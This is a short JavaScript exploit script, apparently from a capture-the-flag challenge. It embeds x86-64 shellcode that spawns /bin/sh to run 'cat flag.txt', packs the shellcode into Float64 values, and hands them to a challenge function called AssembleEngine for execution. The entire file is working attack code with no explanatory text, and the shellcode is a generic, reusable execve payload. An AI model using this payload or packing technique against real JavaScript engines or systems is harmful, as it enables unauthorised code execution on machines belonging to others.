var shellcode = "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x12\x00\x00\x00\x2f\x62\x69\x6e\x2f\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05\x90\x90\x90"
arr = []
var temp
for (var i = 0; i < shellcode.length; i++) {
	if (i %8==0) {
		if (i != 0) {
			var temp2 = new Float64Array(temp.buffer)
			arr.push(temp2[0])
		}
		temp = new Uint8Array([0,0,0,0,0,0,0,0])
	}
	temp[i%8] = shellcode.charCodeAt(i)
}
AssembleEngine(arr)
